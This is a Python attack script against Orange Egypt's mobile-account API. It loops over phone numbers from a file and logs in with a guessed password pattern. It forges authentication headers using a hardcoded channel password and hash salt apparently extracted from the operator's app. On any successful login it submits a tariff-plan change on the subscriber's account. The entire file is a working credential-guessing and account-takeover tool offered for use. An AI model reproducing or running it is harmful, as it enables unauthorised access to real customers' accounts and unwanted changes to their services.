import requests
from hashlib import sha256
dark= open('8.txt' ,'r').read().splitlines()
for i in dark:
	user = i.split('\n')[0]
	number = user.split(':')[0].strip()
	password = number+"@aA#"
	url2 = "https://services.orange.eg/GetToken.svc/GenerateToken"
	hd2 = {"Content-Type":"application/json; charset=UTF-8", "Content-Length":"78" , "Host":"services.orange.eg", "Connection":"Keep-Alive" ,"User-Agent":"okhttp/3.12.1"}
	data2 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
	ctv = requests.post(url2,headers=hd2,data = data2).json()["GenerateTokenResult"]["Token"]
	a=ctv+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
	htv=(sha256(a.encode('utf-8')).hexdigest().upper())
	hd = {"_ctv": ctv,"_htv": htv,'Content-type':'application/json','Accept':'application/json','User-Agent':'okhttp/3.12.0','Host':'services.orange.eg','Accept-Encoding':'gzip'}
	url = "https://services.orange.eg/SignIn.svc/SignInUser"
	data = '{"appVersion":"6.4.0","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","password":"%s","isAndroid":"true"}' % (number, password)
	r = requests.post(url,headers=hd,data=data).json()
	login = r['SignInUserResult']['ErrorDescription']
	if "Success" in login:
		print("Done Login " + number)
		UserID=r['SignInUserResult']['UserData']['UserID']
		url2 = "https://services.orange.eg/GetToken.svc/GenerateToken"
		hd2 = {"Content-Type":"application/json; charset=UTF-8", "Content-Length":"78" , "Host":"services.orange.eg", "Connection":"Keep-Alive" ,"User-Agent":"okhttp/3.12.1"}
		data2 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
		ctv = requests.post(url2,headers=hd2,data = data2).json()["GenerateTokenResult"]["Token"]
		a=ctv+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
		htv=(sha256(a.encode('utf-8')).hexdigest().upper())
		hd3 = {"_ctv": ctv,"_htv": htv,"isEasyLogin": "false","OsVersion":"Android8.0.0","AppVersion":"601","IsAndroid":"true","Content-Type": "application/json; charset=UTF-8","Content-Length": "190","Host": "backend.orange.eg","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
		url3= "https://backend.orange.eg/api/TariffMigration/ReceiveMigrationRequests"
		data3 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dial":"%s","isEasyLogin":false,"lang":"ar","password":"%s","pecSPDesc":"Premier 1000","rpCode":"350","spCode":"983"}' %(number,password)
		r3 =requests.post(url3,headers=hd3,data=data3).json()
		ErrorDescription2=r3['Error']['ErrorDescription']
		print(ErrorDescription2)
	else:
		print("Wrong Account "+ number)
